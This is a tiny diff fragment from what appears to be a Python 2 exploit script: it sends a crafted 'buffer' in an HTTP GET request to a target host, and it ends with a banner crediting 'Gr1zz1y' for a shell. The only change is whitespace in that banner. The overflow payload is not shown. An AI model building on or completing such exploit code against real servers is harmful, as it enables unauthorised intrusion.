@@ -74,4 +74,4 @@ print "[*]Target acquired ----> " + host + ":" + str(port) + "\r\n"
 s.send("GET " + buffer + " HTTP/1.0\r\n\r\n")
 print "[*]Buffer sent[*]\r\n"
 s.close() 
-print "This shell has been brought to you by Gr1zz1y\r\n"
+print "This shell has been brought to you by Gr1zz1y"
